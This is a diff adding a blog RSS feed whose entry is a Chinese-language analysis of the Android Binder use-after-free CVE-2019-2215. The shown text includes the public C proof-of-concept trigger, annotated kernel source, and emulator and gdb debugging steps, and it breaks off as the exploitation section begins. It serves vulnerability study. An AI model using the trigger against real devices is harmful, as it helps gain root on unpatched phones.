@@ -1,0 +1,1547 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>CVE on ykikoqAq</title><link>https://ykiko.top/tags/cve/</link><description>Recent content in CVE on ykikoqAq</description><generator>Hugo -- gohugo.io</generator><language>zh-cn</language><lastBuildDate>Tue, 30 Jun 2020 01:15:26 +0800</lastBuildDate><atom:link href="https://ykiko.top/tags/cve/index.xml" rel="self" type="application/rss+xml"/><item><title>CVE-2019-2215分析利用记录</title><link>https://ykiko.top/p/cve-2019-2215%E5%88%86%E6%9E%90%E5%88%A9%E7%94%A8%E8%AE%B0%E5%BD%95/</link><pubDate>Tue, 30 Jun 2020 01:15:26 +0800</pubDate><guid>https://ykiko.top/p/cve-2019-2215%E5%88%86%E6%9E%90%E5%88%A9%E7%94%A8%E8%AE%B0%E5%BD%95/</guid><description>&lt;h3 id="0x00-前言">0x00 前言&lt;/h3>
+&lt;p>&lt;a class="link" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-2215" target="_blank" rel="noopener"
+>CVE-2019-2215&lt;/a>最初是由syzbot(syzkaller bot)在2017年发现的一个&lt;a class="link" href="https://groups.google.com/forum/#!msg/syzkaller-bugs/QyXdgUhAF50/eLGkcwk9AQAJ" target="_blank" rel="noopener"
+>bug&lt;/a>，在2018年初该bug被修复，没有分配CVE编号，但是该补丁没有向后移植到许多已发布的设备上,比如Pixel和pixel2。&lt;/p>
+&lt;p>&lt;strong>Project Zero&lt;/strong>的**Maddie Stone (@maddiestone)**根据Google的威胁情报小组（TAG）的情报报告再次发现的该bug，她在2019年9月报告了该&lt;a class="link" href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1942" target="_blank" rel="noopener"
+>漏洞&lt;/a>。TAG确认其已用于现实攻击中，TAG表示该漏洞利用可能跟一家出售漏洞和利用工具的以色列公司NSO有关，随后NSO集团发言人公开否认与该漏洞存在任何关系。&lt;/p>
+&lt;h3 id="0x01-分析环境">0x01 分析环境&lt;/h3>
+&lt;ul>
+&lt;li>Android avd api29 x86_64&lt;/li>
+&lt;li>kernel：q-goldfish-android-goldfish-4.14-dev commit id &lt;code>7a3cee43e935b9d526ad07f20bf005ba7e74d05b&lt;/code>&lt;/li>
+&lt;li>pixel Android 10 kernel 3.18&lt;/li>
+&lt;/ul>
+&lt;h3 id="0x02-漏洞分析">0x02 漏洞分析&lt;/h3>
+&lt;p>漏洞为内核上Bind IPC的一个UAF漏洞，成功利用可本地提权，无需进行任何交互，已被恶意软件利用。&lt;/p>
+&lt;h4 id="原理分析">原理分析&lt;/h4>
+&lt;p>先看一个project-zero公开的&lt;a class="link" href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1942" target="_blank" rel="noopener"
+>poc&lt;/a>&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;span class="lnt">25
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="cm">/*
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm">binder_poll() passes the thread-&amp;gt;wait waitqueue that
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm">can be slept on for work. When a thread that uses
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm">epoll explicitly exits using BINDER_THREAD_EXIT,
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm">the waitqueue is freed, but it is never removed
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm">from the corresponding epoll data structure. When
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm">the process subsequently exits, the epoll cleanup
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm">code tries to access the waitlist, which results in
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm">a use-after-free.
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm">*/&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;fcntl.h&amp;gt;&lt;/span>&lt;span class="cp">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;sys/epoll.h&amp;gt;&lt;/span>&lt;span class="cp">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;sys/ioctl.h&amp;gt;&lt;/span>&lt;span class="cp">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;stdio.h&amp;gt;&lt;/span>&lt;span class="cp">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#define BINDER_THREAD_EXIT 0x40046208ul
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kt">int&lt;/span> &lt;span class="nf">main&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">int&lt;/span> &lt;span class="n">fd&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">epfd&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">struct&lt;/span> &lt;span class="n">epoll_event&lt;/span> &lt;span class="n">event&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">{.&lt;/span>&lt;span class="n">events&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">EPOLLIN&lt;/span>&lt;span class="p">};&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">fd&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">open&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;/dev/binder&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">O_RDONLY&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">epfd&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">epoll_create&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1000&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">epoll_ctl&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">epfd&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">EPOLL_CTL_ADD&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">fd&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">event&lt;/span>&lt;span class="p">);&lt;/span> &lt;span class="c1">//[1]
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="n">ioctl&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">fd&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">BINDER_THREAD_EXIT&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nb">NULL&lt;/span>&lt;span class="p">);&lt;/span> &lt;span class="c1">//[2]
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>漏洞原理作者说的很简单就是使用epoll线程调用BINDER_THREAD_EXIT时，会把binder_thread释放，但是没有在epoll数据结构中清除，在后面进程结束或者epoll主动调用EPOLL_CTL_DEL时，epoll又会去遍历前面释放的binder_thread-&amp;gt;wait，导致UAF。&lt;/p>
+&lt;p>既然是个UAF的漏洞，我们主要关注三个点：binder_thread的allocate、free、use。&lt;/p>
+&lt;ul>
+&lt;li>&lt;strong>allocate&lt;/strong>&lt;/li>
+&lt;/ul>
+&lt;p>在poc中的[1]处，通过epoll_ctl创建了一个新的ep_item并且绑定了fd，将其插入到event_poll的红黑树中。fd为前面通过调用open()创建的binder_proc结构体并且&lt;code>fd-&amp;gt;pricate_data = binder_proc&lt;/code>，epfd为调用epoll_create创建的一个epoll结构体，该结构体会添加到结构体队列上。结构大概如图，&lt;a class="link" href="https://github.com/sharif-dev/AndroidKernelVulnerability" target="_blank" rel="noopener"
+>图来源&lt;/a>&lt;/p>
+&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20200628024448.png"
+loading="lazy"
+>&lt;/p>
+&lt;ul>
+&lt;li>&lt;strong>free&lt;/strong>&lt;/li>
+&lt;/ul>
+&lt;p>poc中的[2]处，调用ioctl对fd进行BINDER_THREAD_EXIT操作，从&lt;code>fd-&amp;gt;private_data&lt;/code>中释放&lt;strong>binder_thread&lt;/strong>结构体。整个调用栈如下图所示。最终调用到了binder_free_thread里的kfree释放掉。&lt;/p>
+&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20200628102722.png"
+loading="lazy"
+>&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;span class="lnt">6
+&lt;/span>&lt;span class="lnt">7
+&lt;/span>&lt;span class="lnt">8
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="k">static&lt;/span> &lt;span class="kt">void&lt;/span> &lt;span class="nf">binder_free_thread&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">struct&lt;/span> &lt;span class="n">binder_thread&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="kr">thread&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">BUG_ON&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">!&lt;/span>&lt;span class="n">list_empty&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="kr">thread&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">todo&lt;/span>&lt;span class="p">));&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">binder_stats_deleted&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">BINDER_STAT_THREAD&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">binder_proc_dec_tmpref&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kr">thread&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">proc&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">put_task_struct&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kr">thread&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">task&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">kfree&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kr">thread&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;ul>
+&lt;li>&lt;strong>use&lt;/strong>&lt;/li>
+&lt;/ul>
+&lt;p>在当前线程退出时，会自动调用&lt;strong>epoll_ctl(epfd, DEL, fd, event)&lt;/strong>，这里面会调用到&lt;strong>ep_remove(event_poll, ep_item)&lt;/strong>，这个方法里面会进行unlink wait queues双链表操作，其中的操作&lt;code>entry = wait-&amp;gt;entry;&lt;/code>这里的指针指向已经释放的binder_thread-&amp;gt;wait。造成use after free。&lt;/p>
+&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/eq_remove_queue.png"
+loading="lazy"
+>&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;span class="lnt">25
+&lt;/span>&lt;span class="lnt">26
+&lt;/span>&lt;span class="lnt">27
+&lt;/span>&lt;span class="lnt">28
+&lt;/span>&lt;span class="lnt">29
+&lt;/span>&lt;span class="lnt">30
+&lt;/span>&lt;span class="lnt">31
+&lt;/span>&lt;span class="lnt">32
+&lt;/span>&lt;span class="lnt">33
+&lt;/span>&lt;span class="lnt">34
+&lt;/span>&lt;span class="lnt">35
+&lt;/span>&lt;span class="lnt">36
+&lt;/span>&lt;span class="lnt">37
+&lt;/span>&lt;span class="lnt">38
+&lt;/span>&lt;span class="lnt">39
+&lt;/span>&lt;span class="lnt">40
+&lt;/span>&lt;span class="lnt">41
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="k">static&lt;/span> &lt;span class="kt">void&lt;/span> &lt;span class="nf">ep_remove_wait_queue&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">struct&lt;/span> &lt;span class="n">eppoll_entry&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">pwq&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="c1">//这里的pwq就是我们已经释放掉的binder_thread
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">wait_queue_head_t&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">whead&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">rcu_read_lock&lt;/span>&lt;span class="p">();&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">whead&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">smp_load_acquire&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">pwq&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">whead&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">whead&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">remove_wait_queue&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">whead&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">pwq&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">wait&lt;/span>&lt;span class="p">);&lt;/span> &lt;span class="c1">//进入remove_wait_queue
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="n">rcu_read_unlock&lt;/span>&lt;span class="p">();&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kt">void&lt;/span> &lt;span class="nf">remove_wait_queue&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">struct&lt;/span> &lt;span class="n">wait_queue_head&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">wq_head&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="k">struct&lt;/span> &lt;span class="n">wait_queue_entry&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">wq_entry&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">unsigned&lt;/span> &lt;span class="kt">long&lt;/span> &lt;span class="n">flags&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">spin_lock_irqsave&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">wq_head&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">lock&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">flags&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">__remove_wait_queue&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">wq_head&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">wq_entry&lt;/span>&lt;span class="p">);&lt;/span> &lt;span class="c1">//这里传入的第二个参数&amp;amp;pwq-&amp;gt;wait之前已经被释放
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="n">spin_unlock_irqrestore&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">wq_head&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">lock&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">flags&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">static&lt;/span> &lt;span class="kr">inline&lt;/span> &lt;span class="kt">void&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nf">__remove_wait_queue&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">struct&lt;/span> &lt;span class="n">wait_queue_head&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">wq_head&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="k">struct&lt;/span> &lt;span class="n">wait_queue_entry&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">wq_entry&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">list_del&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">wq_entry&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">entry&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">static&lt;/span> &lt;span class="kr">inline&lt;/span> &lt;span class="kt">void&lt;/span> &lt;span class="nf">list_del&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">struct&lt;/span> &lt;span class="n">list_head&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">entry&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">__list_del_entry&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">entry&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">[...]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">static&lt;/span> &lt;span class="kr">inline&lt;/span> &lt;span class="kt">void&lt;/span> &lt;span class="nf">__list_del_entry&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">struct&lt;/span> &lt;span class="n">list_head&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">entry&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">[...]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">__list_del&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">entry&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">prev&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">entry&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">next&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">static&lt;/span> &lt;span class="kr">inline&lt;/span> &lt;span class="kt">void&lt;/span> &lt;span class="nf">__list_del&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">struct&lt;/span> &lt;span class="n">list_head&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="n">prev&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="k">struct&lt;/span> &lt;span class="n">list_head&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="n">next&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">next&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">prev&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">prev&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="c1">//unlink操作
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="n">WRITE_ONCE&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">prev&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">next&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">next&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>将&lt;code>binder_thread-&amp;gt;wait.head&lt;/code>的指针写入&lt;code>binder_thread-&amp;gt;wait.head.prev&lt;/code>和&lt;code>binder_thread-&amp;gt;wait.head.next&lt;/code>。&lt;/p>
+&lt;h4 id="poc调试分析">Poc调试分析&lt;/h4>
+&lt;p>这里手上没有直接能用的设备，用的模拟器调试。可直接按照&lt;a class="link" href="https://cloudfuzz.github.io/android-kernel-exploitation/chapters/environment-setup.html#software-requirements" target="_blank" rel="noopener"
+>这个教程&lt;/a>的配置调试。不过这个教程关闭了一些保护，使得利用要简单些，不过过程是差不多一样的。&lt;/p>
+&lt;p>编译完goldfish后启动&lt;code>emulator -show-kernel -no-snapshot -wipe-data -avd 2019-2215 -kernel bzImage -qemu -s -S&lt;/code>等待qemu的连接。&lt;/p>
+&lt;p>gdb启动&lt;code>gdb -quiet vmlinux -ex 'target remote :1234'&lt;/code> 键入c继续启动模拟器。&lt;/p>
+&lt;p>等待模拟器完全启动后编译poc push进模拟器。&lt;/p>
+&lt;p>binder_thread释放之前，偏移a8处为&lt;code>wait.head&lt;/code>的值，这里我们拥有内核源码以及编译好的vmliux，所以可以直接算出来&lt;code>wait.head&lt;/code>相对于binder_thread地址的偏移量。&lt;/p>
+&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/b1.png"
+loading="lazy"
+>&lt;/p>
+&lt;p>free之后未unlink之前binder_thread的值一样未变。&lt;/p>
+&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/b2.png"
+loading="lazy"
+>&lt;/p>
+&lt;p>unlink之后，binder_thread-&amp;gt;wait.head写入&lt;code>binder_thread-&amp;gt;wait.head.next&lt;/code> and &lt;code>binder_thread-&amp;gt;wait.head.prev&lt;/code>两个指针。&lt;/p>
+&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/b3.png"
+loading="lazy"
+>&lt;/p>
+&lt;p>在未开启KASan的设备上我们看不到任何奔溃。但是调试时我们能看到确实触发了漏洞。&lt;/p>
+&lt;h3 id="0x03-漏洞利用">0x03 漏洞利用&lt;/h3>
+&lt;p>漏洞t_thread结构体如下：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
